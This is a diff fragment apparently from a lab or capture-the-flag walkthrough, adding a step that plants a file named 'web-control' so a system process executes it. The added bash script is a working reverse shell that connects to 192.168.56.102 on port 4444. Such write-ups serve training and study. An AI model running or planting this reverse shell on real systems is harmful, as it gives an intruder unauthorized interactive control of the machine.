@@ -155,4 +155,8 @@ meaning that the system tries to execute files `web-control` and `product-contro
 
 Let's make a file called `web-control` and put a reverse shell in it
 
+```bash
+#!/bin/bash
 
+bash -i >& /dev/tcp/192.168.56.102/4444 0>&1
+```
